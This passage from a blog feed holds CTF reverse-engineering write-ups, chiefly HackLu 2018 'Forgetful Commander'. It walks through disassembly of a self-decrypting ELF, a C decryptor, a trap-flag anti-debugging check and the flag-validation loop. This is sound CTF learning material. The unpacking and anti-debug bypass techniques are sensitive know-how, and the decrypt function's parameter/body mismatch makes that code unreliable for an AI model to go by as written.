                printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;call [%s]&amp;#34;&lt;/span&gt;, resolve(buffer, (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*)(&amp;amp;i-&amp;gt;imm)-buffer));
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt; {
                uint64_t offset = (i-&amp;gt;imm-&lt;span style=&#34;color:#3677a9&#34;&gt;0x1190&lt;/span&gt;)/&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; instr_t);
                uint64_t imm = i-&amp;gt;imm;
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i-&amp;gt;instr == &lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt; &amp;amp;&amp;amp; i-&amp;gt;dest == &lt;span style=&#34;color:#3677a9&#34;&gt;0x10&lt;/span&gt;)
                    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;jmp %#lx&amp;#34;&lt;/span&gt;, offset);
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt; {
                    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i-&amp;gt;instr &amp;gt;= &lt;span style=&#34;color:#3677a9&#34;&gt;38&lt;/span&gt; &amp;amp;&amp;amp; i-&amp;gt;instr &amp;lt;= &lt;span style=&#34;color:#3677a9&#34;&gt;40&lt;/span&gt;)
                        imm = offset;
                    printf(fmt_strings[i-&amp;gt;instr], imm, regs[i-&amp;gt;dest], regs[i-&amp;gt;src1], regs[i-&amp;gt;src2]);
                }
            }
            putchar(&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;);
            start += &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; instr_t);
        }

        solve(buffer);

        munmap(buffer, stbuf.st_size);
        close(fd);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>HackLu 2018 - Forgetful Commander</title>
        <link>http://localhost:1313/post/hacklu-2018-forgetful-commander/</link>
        <pubDate>Fri, 19 Oct 2018 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/hacklu-2018-forgetful-commander/</guid>
        <description>&lt;p&gt;I&amp;rsquo;ll do static analysis using radare.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/hacklu/ForgetfulCommander/public]
    └──╼ $ objdump -d -M intel -j.text forgetful_commander

    forgetful_commander:     file format elf32-i386

    Disassembly of section .text:

    &lt;span style=&#34;color:#3677a9&#34;&gt;00002050&lt;/span&gt; &amp;lt;.text&amp;gt;:
        2050:       &lt;span style=&#34;color:#3677a9&#34;&gt;99&lt;/span&gt;                      cdq    
        2051:       &lt;span style=&#34;color:#3677a9&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;cd&lt;/span&gt; &lt;span style=&#34;color:#3677a9&#34;&gt;30&lt;/span&gt;                addr16 int 0x30
        2054:       a5                      movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
        2055:       &lt;span style=&#34;color:#3677a9&#34;&gt;02&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;fc&lt;/span&gt;                   add    bh,ah
        ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahh ! So we have garbage in .text. Fire up radare :-)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x0000d000      50             push eax
    0x0000d001      60             pushal
    0x0000d002      9c             pushfd
    0x0000d003      81ec00500000   sub esp, 0x5000
    0x0000d009      b855000000     mov eax, 0x55               ; &#39;U&#39;
    0x0000d00e      6878650000     push 0x6578                 ; &#39;xe&#39;
    0x0000d013      686c662f65     push 0x652f666c             ; &#39;lf/e&#39;
    0x0000d018      68632f7365     push 0x65732f63             ; &#39;c/se&#39;
    0x0000d01d      682f70726f     push 0x6f72702f             ; &#39;/pro&#39;
    0x0000d022      89e3           mov ebx, esp
    0x0000d024      8d8c24104000.  lea ecx, [arg_4010h]        ; 0x4010
    0x0000d02b      baff0f0000     mov edx, 0xfff
    ;-- syscall.readlink:
    0x0000d030      cd80           int 0x80
    0x0000d032      83c410         add esp, 0x10
    0x0000d035      83f800         cmp eax, 0
    0x0000d038      0f8e92010000   jle 0xd1d0
    0x0000d03e      89c7           mov edi, eax
    0x0000d040      8d8c04004000.  lea ecx, [esp + eax + 0x4000]
    0x0000d047      c6010a         mov byte [ecx], 0xa
    0x0000d04a      47             inc edi
    0x0000d04b      b805000000     mov eax, 5
    0x0000d050      6861707300     push 0x737061               ; &#39;aps&#39;
    0x0000d055      686c662f6d     push 0x6d2f666c             ; &#39;lf/m&#39;
    0x0000d05a      68632f7365     push 0x65732f63             ; &#39;c/se&#39;
    0x0000d05f      682f70726f     push 0x6f72702f             ; &#39;/pro&#39;
    0x0000d064      89e3           mov ebx, esp
    0x0000d066      31c9           xor ecx, ecx
    ;-- syscall.open:
    0x0000d068      cd80           int 0x80
    0x0000d06a      83c410         add esp, 0x10
    0x0000d06d      83f800         cmp eax, 0
    0x0000d070      0f8c5a010000   jl 0xd1d0
    0x0000d076      89c6           mov esi, eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, the program reads the path of its executable, i.e., the path for &amp;lsquo;forgetful_commander&amp;rsquo; using &lt;strong&gt;sys_readlink&lt;/strong&gt; and opens the file &lt;strong&gt;&#39;/proc/self/maps&#39;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x0000d078      b803000000     mov eax, 3
    0x0000d07d      89f3           mov ebx, esi
    0x0000d07f      89e1           mov ecx, esp
    0x0000d081      ba00400000     mov edx, 0x4000
    ;-- syscall.read:
    0x0000d086      cd80           int 0x80
    0x0000d088      83f800         cmp eax, 0
    0x0000d08b      0f8ee9000000   jle 0xd17a
    0x0000d091      31c9           xor ecx, ecx
    0x0000d093      31d2           xor edx, edx
    0x0000d095      bd01000000     mov ebp, 1   ; flag for breaking loop
    ; CODE XREFS from entry0 (0xd0b7, 0xd0c6)
    0x0000d09a      39c1           cmp ecx, eax
    0x0000d09c      0f8d29000000   jge 0xd0cb
    0x0000d0a2      0fb61c0c       movzx ebx, byte [esp + ecx]
    0x0000d0a6      41             inc ecx
    0x0000d0a7      389c14004000.  cmp byte [esp + edx + 0x4000], bl
    0x0000d0ae      0f8510000000   jne 0xd0c4
    0x0000d0b4      42             inc edx
    0x0000d0b5      39fa           cmp edx, edi
    0x0000d0b7      0f85ddffffff   jne 0xd09a
    0x0000d0bd      31ed           xor ebp, ebp
    0x0000d0bf      e907000000     jmp 0xd0cb
    ; CODE XREF from entry0 (0xd0ae)
    0x0000d0c4      31d2           xor edx, edx
    0x0000d0c6      e9cfffffff     jmp 0xd09a
    ; CODE XREFS from entry0 (0xd09c, 0xd0bf)
    0x0000d0cb      85ed           test ebp, ebp
    0x0000d0cd      0f85a5ffffff   jne 0xd078
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here we have a loop which reads a block of 16K bytes and searches for the path to its executable followed by a newline. The loop breaks when &lt;strong&gt;ecx&lt;/strong&gt; is the offset of the newline in the string.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x0000d0d3      31db           xor ebx, ebx
    0x0000d0d5      49             dec ecx
    0x0000d0d6      83f900         cmp ecx, 0
    0x0000d0d9      0f9fc3         setg bl
    0x0000d0dc      807c0cff0a     cmp byte [esp + ecx - 1], 0xa ; prev newline
    0x0000d0e1      0f95c7         setne bh
    0x0000d0e4      84fb           test bl, bh
    0x0000d0e6      0f85e7ffffff   jne 0xd0d3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This loop searches for the offset of the previous newline and breaks when &lt;strong&gt;ecx&lt;/strong&gt; points to the beginning of line containing the executable path.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x0000d0ec      31d2           xor edx, edx
    0x0000d0ee      89cd           mov ebp, ecx
    0x0000d0f0      83c108         add ecx, 8   ; 32bit address
    ; CODE XREFS from entry0 (0xd118, 0xd140, 0xd168)
    0x0000d0f3      39cd           cmp ebp, ecx
    0x0000d0f5      0f8d7f000000   jge 0xd17a
    0x0000d0fb      c1c204         rol edx, 4
    0x0000d0fe      31db           xor ebx, ebx
    0x0000d100      803c2c30       cmp byte [esp + ebp], 0x30  ; &#39;0&#39;
    0x0000d104      0f9dc3         setge bl
    0x0000d107      803c2c39       cmp byte [esp + ebp], 0x39  ; &#39;9&#39;
    0x0000d10b      0f9ec7         setle bh
    0x0000d10e      802c2c30       sub byte [esp + ebp], 0x30  ; &#39;0&#39;
    0x0000d112      32142c         xor dl, byte [esp + ebp]
    0x0000d115      45             inc ebp
    0x0000d116      84fb           test bl, bh
    0x0000d118      0f85d5ffffff   jne 0xd0f3
    0x0000d11e      4d             dec ebp
    0x0000d11f      32142c         xor dl, byte [esp + ebp]
    0x0000d122      80042c30       add byte [esp + ebp], 0x30  ; &#39;0&#39;
    0x0000d126      31db           xor ebx, ebx
    0x0000d128      803c2c61       cmp byte [esp + ebp], 0x61  ; &#39;a&#39;
    0x0000d12c      0f9dc3         setge bl
    0x0000d12f      803c2c7a       cmp byte [esp + ebp], 0x7a  ; &#39;z&#39;
    0x0000d133      0f9ec7         setle bh
    0x0000d136      802c2c57       sub byte [esp + ebp], 0x57  ; &#39;W&#39;
    0x0000d13a      32142c         xor dl, byte [esp + ebp]
    0x0000d13d      45             inc ebp
    0x0000d13e      84fb           test bl, bh
    0x0000d140      0f85adffffff   jne 0xd0f3
    0x0000d146      4d             dec ebp
    0x0000d147      32142c         xor dl, byte [esp + ebp]
    0x0000d14a      80042c61       add byte [esp + ebp], 0x61  ; &#39;a&#39;
    0x0000d14e      31db           xor ebx, ebx
    0x0000d150      803c2c41       cmp byte [esp + ebp], 0x41  ; &#39;A&#39;
    0x0000d154      0f9dc3         setge bl
    0x0000d157      803c2c5a       cmp byte [esp + ebp], 0x5a  ; &#39;Z&#39;
    0x0000d15b      0f9ec7         setle bh
    0x0000d15e      802c2c37       sub byte [esp + ebp], 0x37  ; &#39;7&#39;
    0x0000d162      32142c         xor dl, byte [esp + ebp]
    0x0000d165      45             inc ebp
    0x0000d166      84fb           test bl, bh
    0x0000d168      0f8585ffffff   jne 0xd0f3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This loop parses the address pointed to by &lt;strong&gt;ecx&lt;/strong&gt; into &lt;strong&gt;edx&lt;/strong&gt;. The base address of the map&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x0000d183      85d2           test edx, edx
    0x0000d185      0f8445000000   je 0xd1d0
    0x0000d18b      81c250200000   add edx, 0x2050
    0x0000d191      899424245000.  mov dword [arg_5024h], edx ; return addr
    0x0000d198      83ea50         sub edx, 0x50
    0x0000d19b      89c5           mov ebp, eax     ; eax = 0
    0x0000d19d      40             inc eax
    0x0000d19e      40             inc eax
    ; CODE XREF from entry0 (0xd1c2)
    0x0000d19f      be78756c46     mov esi, 0x466c7578         ; &#39;xulF&#39;
    0x0000d1a4      31db           xor ebx, ebx
    0x0000d1a6      39e8           cmp eax, ebp
    0x0000d1a8      0f8419000000   je 0xd1c7
    0x0000d1ae      b900040000     mov ecx, 0x400
    ; CODE XREF from entry0 (0xd1bf)
    0x0000d1b3      311a           xor dword [edx], ebx
    0x0000d1b5      3132           xor dword [edx], esi
    0x0000d1b7      c1ce08         ror esi, 8
    0x0000d1ba      8b1a           mov ebx, dword [edx]
    0x0000d1bc      83c204         add edx, 4
    0x0000d1bf      e2f2           loop 0xd1b3
    0x0000d1c1      48             dec eax
    0x0000d1c2      e9d8ffffff     jmp 0xd19f
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Return address is &lt;strong&gt;edx+0x2050&lt;/strong&gt;. This loop decrypts the 2*4K bytes or 2 pages mapped from 0x2000 and then jumps to &lt;strong&gt;edx+0x2050&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/hacklu/ForgetfulCommander/public]                                                                                                                                                                       
    └──╼ $ readelf --program-headers forgetful_commander

    Elf file &lt;span style=&#34;color:#24909d&#34;&gt;type&lt;/span&gt; is DYN (Shared object file)
    Entry point 0xd000
    There are &lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt; program headers, starting at offset &lt;span style=&#34;color:#3677a9&#34;&gt;52&lt;/span&gt;

    Program Headers:
      Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
      ...
      LOAD           0x002000 0x00002000 0x00002000 0x00338 0x00338 RWE 0x1000
      LOAD           0x003000 0x00003000 0x00003000 0x004f0 0x004f0 RW  0x1000
      ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So we need to decrypt &lt;strong&gt;0x338 bytes&lt;/strong&gt; at &lt;strong&gt;offset 0x2000&lt;/strong&gt; and &lt;strong&gt;0x4f0 bytes&lt;/strong&gt; at &lt;strong&gt;offset 0x3000&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;decrypt&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* base, size_t size)
    {
        uint32_t* addr = (uint32_t*) mem;
        uint32_t k = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
        uint32_t u = &lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&amp;#39;&lt;/span&gt;Flux&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&amp;#39;&lt;/span&gt;;
        size &amp;gt;&amp;gt;= &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; j = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; j &amp;lt; size; ++j) {
            *addr ^= k^u;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;asm&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;volatile&lt;/span&gt; (&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rorl $8, %0&amp;#34;&lt;/span&gt; :: &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;(u));
            k = *addr++;
        }
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;()
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; file = open(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;forgetful_commander&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; file_size = &lt;span style=&#34;color:#3677a9&#34;&gt;0x338&lt;/span&gt; &amp;gt;&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; stat sBuf;
        fstat(file, &amp;amp;sBuf);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* mem = mmap(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, sBuf.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, file, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        decrypt(mem+&lt;span style=&#34;color:#3677a9&#34;&gt;0x2000&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x338&lt;/span&gt;);
        decrypt(mem+&lt;span style=&#34;color:#3677a9&#34;&gt;0x3000&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x4f0&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; outfile = open(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;forgetful&amp;#34;&lt;/span&gt;, O_WRONLY|O_CREAT|O_TRUNC, &lt;span style=&#34;color:#3677a9&#34;&gt;0777&lt;/span&gt;);
        write(outfile, mem, sBuf.st_size);
        munmap(mem, sBuf.st_size);
        close(outfile);
        close(file);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now lets open &amp;lsquo;forgetful&amp;rsquo; in radare and disassemble at offset 0x2050.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    ;-- section..text:
    0x00002050      31ed           xor ebp, ebp
    0x00002052      5e             pop esi
    0x00002053      89e1           mov ecx, esp
    0x00002055      83e4f0         and esp, 0xfffffff0
    0x00002058      50             push eax
    0x00002059      54             push esp
    0x0000205a      52             push edx
    0x0000205b      e822000000     call __pc_thunk_bx
    0x00002060      81c3a02f0000   add ebx, 0x2fa0
    0x00002066      8d8320d3ffff   lea eax, [ebx - 0x2ce0]
    0x0000206c      50             push eax
    0x0000206d      8d83c0d2ffff   lea eax, [ebx - 0x2d40]
    0x00002073      50             push eax
    0x00002074      51             push ecx
    0x00002075      56             push esi
    0x00002076      ffb3f8ffffff   push dword [ebx - 8] ; 0x2190
    0x0000207c      e8bfffffff     call sym.imp.__libc_start_main
    0x00002081      f4             hlt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great ! This is the new entry point. Lets move on to &lt;strong&gt;main&lt;/strong&gt; which is at offset 0x2190&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x00002190      55             push ebp
    0x00002191      89e5           mov ebp, esp
    0x00002193      53             push ebx
    0x00002194      57             push edi
    0x00002195      56             push esi
    0x00002196      83ec2c         sub esp, 0x2c            ; &#39;,&#39;
    0x00002199      e800000000     call __get_pc_thunk_ebx
    0x0000219e      58             pop eax
    0x0000219f      81c0622e0000   add eax, 0x2e62          ; eax = 0x5000
    0x000021a5      8b4d0c         mov ecx, dword [arg_ch]  ; argv
    0x000021a8      8b5508         mov edx, dword [arg_8h]  ; argc
    0x000021ab      c745f0000000.  mov dword [local_10h], 0
    0x000021b2      837d0802       cmp dword [arg_8h], 2
    0x000021b6      8945d8         mov dword [local_28h], eax
    0x000021b9      894dd4         mov dword [local_2ch], ecx
    0x000021bc      8955d0         mov dword [local_30h], edx
    0x000021bf      0f840c000000   je 0x21d1
    0x000021c5      c745f0010000.  mov dword [local_10h], 1 ; exit code
    0x000021cc      e9d7000000     jmp 0x22a8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we need to pass 2 arguments to the commander. Lets to to 0x21d1&amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x000021d1      c745ec000000.  mov dword [local_14h], 0
    0x000021d8      c745e8050000.  mov dword [local_18h], 5
    0x000021df      c745e4050000.  mov dword [local_1ch], 5
    0x000021e6      c745e0000000.  mov dword [local_20h], 0

    0x000021ed      8b45e0         mov eax, dword [local_20h]   ; loop counter
    0x000021f0      8b4d0c         mov ecx, dword [arg_ch]
    0x000021f3      8b4904         mov ecx, dword [ecx + 4]
    0x000021f6      89e2           mov edx, esp
    0x000021f8      890a           mov dword [edx], ecx
    0x000021fa      8b5dd8         mov ebx, dword [local_28h]
    0x000021fd      8945cc         mov dword [local_34h], eax
    0x00002200      e82bfeffff     call sym.imp.strlen
    0x00002205      8b4dcc         mov ecx, dword [local_34h]
    0x00002208      39c1           cmp ecx, eax
    ; local_20h &amp;lt; len(argv[1])
    0x0000220a      0f837b000000   jae 0x228b

    0x00002210      8b450c         mov eax, dword [arg_ch]
    0x00002213      8b4004         mov eax, dword [eax + 4]
    0x00002216      8b4de0         mov ecx, dword [local_20h]
    0x00002219      8a1408         mov dl, byte [eax + ecx]
    0x0000221c      8855df         mov byte [local_21h], dl     ; argv[1][local_20h]
    0x0000221f      8b45e8         mov eax, dword [local_18h]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&amp;rsquo;s some anti-debugging code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x00002222      9c             pushfd
    0x00002223      5a             pop edx
    0x00002224      89d1           mov ecx, edx
    0x00002226      81e100010000   and ecx, 0x100   ; EFLAGS.Trap

    ; Clear EFLAGS.Trap from edx
    0x0000222c      31ca           xor edx, ecx

    ; Copy EFLAGS.Trap to EFLAGS.ZeroFlag
    0x0000222e      c1c902         ror ecx, 2
    0x00002231      31ca           xor edx, ecx

    0x00002233      52             push edx
    0x00002234      89c2           mov edx, eax
    0x00002236      9d             popfd

    ; ecx = 0x100 &amp;gt;&amp;gt; 2 i.e. 0x40 if EFLAGS.Trap is set
    0x00002237      0f44d1         cmove edx, ecx
    0x0000223a      89d0           mov eax, edx
    0x0000223c      8945e8         mov dword [local_18h], eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, &lt;strong&gt;local_18h&lt;/strong&gt; is 0x40 if &lt;strong&gt;EFLAGS.Trap&lt;/strong&gt; is set otherwise 0x05&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    0x0000223f      0fbe45df       movsx eax, byte [local_21h]
    0x00002243      8b4de0         mov ecx, dword [local_20h]
    0x00002246      8b75d8         mov esi, dword [local_28h]   ; offset 0x5000
    0x00002249      0fbe8c0ef1e3.  movsx ecx, byte [esi + ecx - 0x1c0f]
    0x00002251      8b7de8         mov edi, dword [local_18h]
    0x00002254      8b5de0         mov ebx, dword [local_20h]
    0x00002257      0faf5de4       imul ebx, dword [local_1ch]
    0x0000225b      01df           add edi, ebx
    0x0000225d      0fbebc3e08e0.  movsx edi, byte [esi + edi - 0x1ff8]
    0x00002265      31f9           xor ecx, edi
    0x00002267      39c8           cmp eax, ecx
    0x00002269      0f8509000000   jne 0x2278
    0x0000226f      8b45ec         mov eax, dword [local_14h]
    0x00002272      83c001         add eax, 1
    0x00002275      8945ec         mov dword [local_14h], eax
    ; CODE XREF from sub.strlen_19e (0x2269)
    0x00002278      e900000000     jmp 0x227d
    ; CODE XREF from sub.strlen_19e (0x2278)
    0x0000227d      8b45e0         mov eax, dword [local_20h]
    0x00002280      83c001         add eax, 1
    0x00002283      8945e0         mov dword [local_20h], eax
    0x00002286      e962ffffff     jmp 0x21ed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, this is a simple validation loop&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    m = &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; debugging:
        m = &lt;span style=&#34;color:#3677a9&#34;&gt;0x40&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(sys.argv[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;])):
        argv[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;][i] == ((base+&lt;span style=&#34;color:#3677a9&#34;&gt;0x3008&lt;/span&gt;)[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;*i+m] ^ (base+&lt;span style=&#34;color:#3677a9&#34;&gt;0x33f1&lt;/span&gt;)[i])
